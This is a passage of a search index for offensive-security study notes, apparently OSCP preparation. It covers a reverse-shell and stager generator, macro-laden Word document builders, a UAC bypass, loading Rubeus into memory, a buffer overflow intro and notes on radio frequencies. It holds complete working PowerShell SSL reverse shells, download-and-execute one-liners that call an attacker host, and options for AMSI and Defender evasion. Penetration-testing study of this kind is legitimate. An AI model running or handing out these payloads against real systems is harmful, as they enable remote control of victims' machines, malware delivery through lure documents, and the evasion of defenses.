<code>download</code>  --&gt; Download files hosted on the PMA server - <code>upload</code>    --&gt; Upload files to the PMA server - <code>import</code>    --&gt; Load PowerShell files and C# binaries into the session</p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#advanced-example","title":"Advanced Example","text":"<ol> <li>Launch <code>pma_server.py</code> to listen over port 443.</li> <li>Set up an SSL revshell listener on port 53.</li> <li>Execute advanced <code>Get-RevShell.ps1</code> payload on the victim (that includes the -WebClientHelpers parameter).</li> <li>Use WebClient helpers to upload and import file(s) (this example includes .NET reflection).</li> <li>See files laterally moving on the <code>pma_server.py</code>.</li> <li>Set up a second listener on port 80.</li> <li>Execute the <code>SharpShell.dll</code> PoC via .NET reflection.</li> <li>Successful <code>SharpShell</code> execution.</li> </ol>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#revshells","title":"revshells","text":"<p>This directory contains scripts intended for advanced, robust reverse shell generation. They have been tested and built to work in both Linux and Windows Environments (i.e., PowerShell and PowerShell Core / pwsh), and default to PowerShell 5.0 payloads, but can be toggled to support PowerShell 2.0.</p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#get-revshellps1","title":"<code>Get-RevShell.ps1</code>","text":"<pre><code># Synopsis:\n# Modular, robust custom reverse shell generator with randomly generated variables\n# that can bypass Windows Defender, provide seemless encryption, and have built-in\n# tools for intuitive lateral file tranfers.\n# \n# Parameters:\n#    Main Functionality\n#      -IPAddress             --&gt;   Attacker IP address (required)\n#      -Port                  --&gt;   Attacker listening port (required)\n#      -Raw                   --&gt;   Return reverse shell payload in cleartext rather than base64\n#      -Help                  --&gt;   Return Get-Help information\n#\n#    Modular Options\n#      -AmsiBypass            --&gt;   Disable AMSI in current session (validated: 26SEP2023)\n#      -SSL                   --&gt;   Encrypt reverse shell via SSL with self-signed certificates\n#      -HttpsBypass           --&gt;   Disable HTTPS self-signed certificate checks in the session\n#      -B64Reflection         --&gt;   Reflects a static Base64 string of 'SSC.dll' instead of using Add-Type in the payload\n#      -PowerShell2Support    --&gt;   Adjust the reverse shell payload to support PowerShell 2.0\n#      -Headless              --&gt;   Create reverse shell payload without '-nop -ex bypass -wi h' parameters\n#      -Verbose               --&gt;   Make reverse shell variables descriptive instead of randomly generated\n#\n#    PMA Server Compatibility (Static)\n#      -WebClientHelpers      --&gt;   Add WebClientHelpers ('download','upload','import') into the revshell, pointing to the revshell IP address\n#      -RemoteReflection      --&gt;   Remotely reflect 'SSC.dll' from the revshell IP address instead of using Add-Type in the payload\n#\n#    PMA Server Compatibility (Specified)\n#      -RemoteReflectionURL   --&gt;   Specific URL hosting 'SSC.dll' to reflect (e.g., 'http(s)://&lt;ip_addr&gt;/SSC.dll')\n#      -WebClientHelpersURL   --&gt;   Specific URL of 'pma_server.py' to point WebClientHelpers to (e.g., 'http(s)://&lt;ip_addr&gt;')\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#get-stagerps1","title":"<code>Get-Stager.ps1</code>","text":"<pre><code># Synopsis:\n# Simple PowerShell stager generator to point to web hosted payloads or commands.\n# \n# Parameters:\n#   -PayloadURL  --&gt;  URL pointing to the reverse shell payload\n#   -Command     --&gt;  PowerShell command to execute instead of a reverse shell stager\n#   -Raw         --&gt;  Return stager payload in cleartext rather than base64\n#   -Headless    --&gt;  Create stager payload without '-' parameters\n#   -Help        --&gt;  Return Get-Help information\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#examples","title":"Examples","text":"<pre><code># View all parameters\nGet-RevShell -Help\nGet-Stager -Help\n\n# Simple PowerShell Reverse Shell (base64)\nGet-RevShell &lt;attacker_ip&gt; &lt;listening_port&gt;\n\n# Simple PowerShell Reverse Shell (cleartext)\nGet-RevShell &lt;attacker_ip&gt; &lt;listening_port&gt; -Raw\n\n# PowerShell 2.0 Compatible Reverse Shell w/ Verbose Variables (cleartext)\nGet-RevShell &lt;attacker_ip&gt; &lt;listening_port&gt; -Raw -Verbose -PowerShell2Support\n\n# SSL Encrypted PowerShell Reverse Shell w/ AMSI Bypass (base64)\nGet-RevShell &lt;attacker_ip&gt; &lt;listening_port&gt; -SSL -AmsiBypass\n\n# Stager pointing to Robust PowerShell Reverse Shell\nGet-RevShell &lt;attacker_ip&gt; &lt;listening_port&gt; -SSL -AmsiBypass -WebClientHelpers &gt; ./uploads/revshell\nGet-Stager -PayloadURL \"http(s)://&lt;attacker_ip&gt;/revshell\"\n\n# Output (default):\npowershell -nop -ex bypass -wi h -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAKABzACkAOgAvAC8APABhAHQAdABhAGMAawBlAHIAXwBpAHAAPgAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA=\n\n# Output (cleartext):\npowershell -nop -ex bypass -wi h -c {iex ((New-Object System.Net.WebClient).DownloadString('https(s)://&lt;attacker_ip&gt;/revshell'))}\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#officemacros","title":"officemacros","text":"<p>This directory contains scripts intended for Microsoft Office-based payloads in the form of VBA macros and remote template injection.  </p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#get-macroinfestedworddocps1","title":"<code>Get-MacroInfestedWordDoc.ps1</code>","text":"<pre><code># Synopsis:\n# Generate Macro Infested Word 97-2003 Documents (.doc)\n# \n# Parameters:\n#   -DocumentName   --&gt;  Output name of the malicious Word Document (.doc)\n#   -PayloadURL     --&gt;  URL of the hosted payload that the macro downloads and executes\n#   -MacroContents  --&gt;  Advanced: User inputs custom macro instead of the generated one\n#   -Help           --&gt;  Return Get-Help information\n\n# Example:\nGet-MacroInfestedWordDoc -DocumentName invoice.doc -PayloadURL http://&lt;attacker_ip&gt;/revshell\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#get-templateinjectedpayloadps1","title":"<code>Get-TemplateInjectedPayload.ps1</code>","text":"<pre><code># Synopsis:\n# Generate Macro Infested Word Template (.dotm) an Inject into a Word Document (.docx)\n# \n# Parameters:\n#   -TemplateURL    --&gt;  URL where the malicious Word Template (.dotm) will be hosted\n#   -PayloadURL     --&gt;  URL of the hosted payload that the macro downloads and executes\n#   -Document       --&gt;  Advanced: Target templated Word Document (.docx) to inject\n#   -MacroContents  --&gt;  Advanced: User inputs custom macro instead of the generated one\n#   -Help           --&gt;  Return Get-Help information\n\n# Example:\nGet-TemplateInjectedPayload -TemplateURL http://&lt;attacker_ip&gt;/office/update.dotm -PayloadURL http://&lt;attacker_ip&gt;/revshell\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#privesc","title":"privesc","text":"<p>This directory contains scripts intended for privilege escalation or enumeration for privilege escalation vectors.  </p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#enum-servicesps1","title":"<code>Enum-Services.ps1</code>","text":"<pre><code># Synopsis:\n# Enumeration script developed to easily parse the Access Control Lists (ACLs) and other parameters\n# of Windows Services, such as the service owner, start mode, and whether the service path is vulnerable\n# to an unquoted service path attack.  Unquoted service paths are able to be audited for writeability\n# via the '-Audit' parameter.\n#\n# By default the script will return an object containing sorted service binary ACLs.\n# \n# Parameters:\n#   -StartMode      --&gt;  Services with specified start modes (e.g., 'Auto','Disabled','Manual')\n#   -UnquotedPaths  --&gt;  Services containing spaces in their paths but not wrapped in quotations\n#   -Audit          --&gt;  Test if vulnerable portions of the unquoted path are writeable for the current user\n#   -Owner          --&gt;  Services belonging to specified Owner (e.g., 'SYSTEM')\n#   -FullControl    --&gt;  Services with FullControl access rights for specified group (e.g., 'Administrators')\n#   -OnlyPath       --&gt;  Return full service paths instead of ACL's\n#   -Help           --&gt;  Return Get-Help information\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#invoke-fodhelperuacbypassps1","title":"<code>Invoke-FodHelperUACBypass.ps1</code>","text":"<pre><code># Synopsis:\n# Privilege esclation script developed to exploit the 'fodhelper.exe' UAC bypass,\n# with moderate validation built in (e.g., session is 64-bit, current user is in\n# the Local Administrators group).\n# \n# Parameters:\n#   -Payload  --&gt;  Command to execute when 'fodhelper.exe' is executed.\n#   -Help     --&gt;  Return Get-Help information\n</code></pre>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/PoorMansArmory%20Cheatsheet/#misc","title":"misc","text":"<p>This directory contains scripts and <code>.dll's</code> that are either scarcely used, difficult to categorize, or simple/educational in design.  </p> <ul> <li> <p>Helpers</p> <ul> <li>This includes <code>SSC.dll</code> and <code>Load-WebClientHelpers.ps1</code></li> </ul> </li> <li> <p>Proof-of-Concept (PoC)</p> <ul> <li>This includes the <code>Capture-Keys.ps1</code> keylogger, <code>Get-WifiCredentials.ps1</code> dumper, <code>Execute-As.ps1</code> script, and <code>SharpShell.dll</code>.</li> </ul> </li> <li> <p>Educational</p> <ul> <li>This includes <code>Invoke-RevShellSSL.ps1</code>, <code>Invoke-SharpShell.ps1</code>, and <code>Bypass-ExecPolicy.ps1</code>.</li> </ul> </li> </ul>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Rubeus%20Cheatsheet/","title":"Rubeus Cheatsheet","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Rubeus%20Cheatsheet/#overview","title":"Overview","text":"<p>Rubeus is a  robust C# toolset for raw Kerberos interaction and abuses.</p>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Rubeus%20Cheatsheet/#usage","title":"Usage","text":""},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Rubeus%20Cheatsheet/#common-commands","title":"Common Commands","text":"<ul> <li>Find here: https://github.com/blackhatethicalhacking/Rubeus#command-line-usage</li> </ul>"},{"location":"Red%20Cell/14.%20Cheatsheets/Tools/Rubeus%20Cheatsheet/#rubeus-in-memory","title":"Rubeus in Memory","text":"<pre><code># Download Rubeus to Attacker\nwget https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Rubeus.ps1\n# OR\nwget https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1\n\n# Host on Web Server\n</code></pre> <pre><code># On Victim: Load into Session\niex ([System.Net.WebClient]::new().DownloadString('&lt;url&gt;/Invoke-Rubeus.ps1'))\n\n# Usage\nInvoke-Rubeus -Command \"&lt;rubeus_arguments&gt;\"\n</code></pre>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/","title":"Technique Ted Talks (TTTs)","text":"<ul> <li>Technique Ted Talks (TTTs) is a miscellaneous section containing notes covering an overview of/introduction to topics that may be implied (or not implicitly covered in depth) in other notes.</li> </ul>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Binary Exploitation</li> <li>Introduction to Radio Frequencies (RF)</li> <li>Loading .NET into PowerShell</li> </ul>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/Binary%20Exploitation/","title":"Binary Exploitation","text":"<p>(Thank you @numonce)</p>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/Binary%20Exploitation/#overview","title":"Overview","text":"<p>Binary exploitation is\u00a0the process of subverting a compiled application such that it violates some trust boundary in a way that is advantageous to you, the attacker. We'll be focusing on memory corruption types in this section, since that's what's covered in OSCP.  Unlike the PWK/OSCP course we'll be using radare2, because I like it. We won't be covering the basics of assembly, so if you want something that can give you a pretty good idea in under 2 hours check Liveoverflow's Binary Exploitation playlist on YouTube. </p>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/Binary%20Exploitation/#white-box","title":"White box","text":"<p>White box simply means we have the source code of the program that we're given the executable that we're trying to exploit. Let's take a simple gets() exploit program.</p> <p>Info</p> <p>If you're following along, compile with <code>gcc -m32 test.c -o test -fno-stack-protector -no-pie</code> and disable aslr</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n  char a[65];\n  printf(\"This is totally safe code.\\n\");\n  gets(a);\n}\n</code></pre> <p><code>gets()</code> is a inherently unsafe function because it has no built in mechanism to check the size of user input. Meaning, that we can send input of an arbitrary size to the a array that can only hold 65 bytes. now we could take over the IP (Instruction pointer) registry after sending more that 65 bytes (including the null byte at the end). </p> <p>This doesn't crash because we filled the buffer without overflowing it.</p> <p></p> <p>This didn't overflow because we filled the buffer all the way up to the correct limit, but adding just a single byte will make it segfault.</p> <p></p> <p>The total amount of bytes it takes to get to the IP is completely dependent on the compiler, so it's good practice to use a debugger like radare2 for this. </p> <p>Warning</p> <p>Binary exploitation is a really vast topic, and being that OSCP no longer guarantees the use of a bufferflow, and even if it does, is guaranteed not to be apart of AD I won't be continuing notes on this subject. </p>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/Introduction%20to%20Radio%20Frequencies%20%28RF%29/","title":"Introduction to Radio Frequencies (RF)","text":"<p>Info</p> <p>This note is still in development.</p> <p>Sin waves -- lower frequencies have further throughput, but improved range.</p> <ul> <li>AM Frequencies: 540 kHz - 1700kHz</li> <li>FM Frequencies: 88 mHz - 108 MHz</li> </ul> <p></p> <p>Determining RF Modulation is effectively a wireless version of a cable determining a BOD rate</p> <p>Even /round numbers (outside of the AM/FM range) can be indicative of frequencies of interest, because nature doesn't really like pretty numbers.</p> <p>Modulation Types: - PSK = Phase Shift Key - BPSK = Bi PSK (Binary Phase-Shift Keying) - QPSK = Quad PSK (Quadrature Phase-Shift Keying) - DQPSK = Diff-Quad PSK (Differential Quadrature Phase-Shift Keying)</p> <p>Transceiver = Transmitter + Receiver Transponder = Relay that can modify the frequency</p> <p>Examples: - HackRF = Transceiver - RTLSDR = Receiver (should be at the event)</p> <p>FCC ID codes can allow us to find the frequencies of transmitters, assuming we know what transmitter is being used</p> <p>Order of Operations for Manipulation: - Find frequency - Determine Modulation - Send data (manipulate)</p>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/Loading%20.NET%20into%20PowerShell/","title":"Loading .NET into PowerShell","text":""},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/Loading%20.NET%20into%20PowerShell/#overview","title":"Overview","text":"<p>.NET classes are fundamental building blocks in the Microsoft .NET Framework. Classes define properties, methods, and events, allowing developers to structure and organize code in a modular and reusable way.  With .NET being a cornerstone of Windows, the ability to load custom classes into PowerShell gives attackers near infinite possibilities in terms of capabilities. Nearly anything you can develop in C# in theory can be loaded into a PowerShell session if written correctly.</p>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/Loading%20.NET%20into%20PowerShell/#loading-custom-net-classes-into-powershell-via-add-type","title":"Loading Custom .NET  Classes into PowerShell via Add-Type","text":"<p>PowerShell is neat because it allows us to write native C# code and load them into the current session with different types of tools, most common being <code>Add-Type</code>. My personal most common use for it is using custom code to effectively disable the server certificate check that <code>[System.Net.WebClient]</code> uses.  This allows for communication with a simple web server over HTTPS using self signed certificates instead of HTTP.</p> <ul> <li>For another example, below is an SSL encrypted PowerShell reverse shell payload using a custom .NET Class:</li> </ul> <pre><code># $IPAddress = \"&lt;attacker_ip&gt;\"\n# $Port = &lt;listening_port&gt;\n\n# Custom Self-Signed Certificate bypass .NET class\n$SSC = @'\nusing System;\nusing System.Net;\nusing System.Net.Sockets;\nusing System.Net.Security;\nusing System.Security.Cryptography.X509Certificates;\npublic class SelfSignedCerts\n{\n    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)\n    {\n        return true;\n    }\n    public static SslStream Stream(TcpClient client)\n    {\n        return new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(Bypass), null);\n    }\n}\n'@\n# Load Bypass into PowerShell session\nAdd-Type $SSC\n\n# Simple PowerShell reverse shell using encrypted stream\n$Client = [System.Net.Sockets.TcpClient]::new(\"$IPAddress\",$Port)\n$Stream = [SelfSignedCerts]::Stream($Client)\n$Stream.AuthenticateAsClient(\"\")\n[byte[]]$Buffer = 0..65535 | % {0}\n$LastError = $Error[0]\nwhile (($Data = $Stream.Read($Buffer,0,$Buffer.Length)) -ne 0) {\n    $Command   = [System.Text.ASCIIEncoding]::new().GetString($Buffer,0,$Data)\n    $Execution = (iex $Command *&gt;&amp;1 | Out-String)\n    if ($Error[0] -ne $LastError) { $LastError = $Error[0]; $Execution += \"$LastError`n\" }\n    $OutString = $Execution + \"PS \" + (PWD).Path + \"&gt; \"\n    $OutBytes  = ([Text.Encoding]::ASCII).GetBytes($OutString)\n    $Stream.Write($OutBytes,0,$OutBytes.Length)\n    $Stream.Flush()\n}\n$Client.Close()\n</code></pre>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/Loading%20.NET%20into%20PowerShell/#loading-custom-net-classes-into-powershell-via-reflection","title":"Loading Custom .NET Classes into PowerShell via Reflection","text":"<p>Another really neat method of loading powerful C# tomfoolery into session is via reflection -- specifically using <code>[System.Reflection.Assembly]::Load(&lt;intended_assembly_here&gt;)</code>. This method is especially powerful because you can load complete C# binaries into session. When combining this with <code>[System.Net.WebClient]</code>, you can even host C# binaries on your attacker and load them into a session remotely on a compromised host; a prime example of this would be exploiting <code>SeImpersonatePrivilege</code> for privilege escalation all from memory via a reflected tool.</p> <ul> <li>Below is an example of this using my custom SigmaPotato repository: https://github.com/tylerdotrar/SigmaPotato</li> </ul> <pre><code># Load Remotely Hosted C# binary into PowerShell via Reflection\n$WebClient = New-Object System.Net.WebClient\n$DownloadData = $WebClient.DownloadData(\"http(s)://&lt;ip_addr&gt;/SigmaPotato.exe\")\n[System.Reflection.Assembly]::Load($DownloadData)\n\n# Load Remotely Hosted C# binary into PowerShell via Reflection (one-liner)\n[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData(\"http(s)://&lt;ip_addr&gt;/SigmaPotato.exe\"))\n\n# Execute binary entirely from memory\n[SigmaPotato]::Main('&lt;command&gt;')\n</code></pre>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/Loading%20.NET%20into%20PowerShell/#tying-it-all-together","title":"Tying it all Together","text":"<p>Turns out <code>Add-Type</code> has the ability to compile really simple assemblies (e.g., <code>.dll</code> or <code>.exe</code>) instead of just loading them into session. Meaning instead of needing Visual Studio to compile a binary for something simple like a self-signed certificate bypass, we can...</p> <ol> <li>Create a small <code>.dll</code> using <code>Add-Type</code>.</li> <li>Host the <code>.dll</code> it on our attacker using a simple web server.</li> <li>Load it into a PowerShell session it via <code>[System.Reflection.Assembly]</code>.</li> <li>This achieves the same result without hardcoding the entire class in cleartext.</li> </ol> <p>For this final example, I'll recreate the reverse shell payload from the first section, however instead of loading the <code>[SelfSignedCerts]</code> class into session via <code>Add-Type</code>, I've instead used <code>Add-Type $SSC -OutputAssembly SSC.dll</code> on my attacker to create an <code>SSC.dll</code> assembly from the original example code, and began hosting it on a simple web server on my attacker. Now for the reverse shell payload, instead of including the entire C# source code, we can replace that code snippet in our payload with an assembly reflection pointing to the hosted <code>SSC.dll</code>.</p> <pre><code># $IPAddress = \"&lt;attacker_ip&gt;\"\n# $Port = &lt;listening_port&gt;\n\n# Load remotely hosted self-signed certificate bypass C# binary\n[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData(\"http(s)://&lt;ip_addr&gt;/SSC.dll\"))\n\n# Simple PowerShell reverse shell using encrypted stream\n$Client = [System.Net.Sockets.TcpClient]::new(\"$IPAddress\",$Port)\n$Stream = [SelfSignedCerts]::Stream($Client)\n$Stream.AuthenticateAsClient(\"\")\n[byte[]]$Buffer = 0..65535 | % {0}\n$LastError = $Error[0]\nwhile (($Data = $Stream.Read($Buffer,0,$Buffer.Length)) -ne 0) {\n    $Command   = [System.Text.ASCIIEncoding]::new().GetString($Buffer,0,$Data)\n    $Execution = (iex $Command *&gt;&amp;1 | Out-String)\n    if ($Error[0] -ne $LastError) { $LastError = $Error[0]; $Execution += \"$LastError`n\" }\n    $OutString = $Execution + \"PS \" + (PWD).Path + \"&gt; \"\n    $OutBytes  = ([Text.Encoding]::ASCII).GetBytes($OutString)\n    $Stream.Write($OutBytes,0,$OutBytes.Length)\n    $Stream.Flush()\n}\n$Client.Close()\n</code></pre>"},{"location":"Red%20Cell/15.%20Technique%20Ted%20Talks%20%28TTTs%29/Loading%20.NET%20into%20PowerShell/#conclusion","title":"Conclusion","text":"<p>All methods have pros and cons -- sometimes it's easier to just leave the code snippet in the payload and add it to session via <code>Add-Type</code> -- sometimes size is a concern, so we just want to point to it via reflection, etc etc etc.</p>"}]}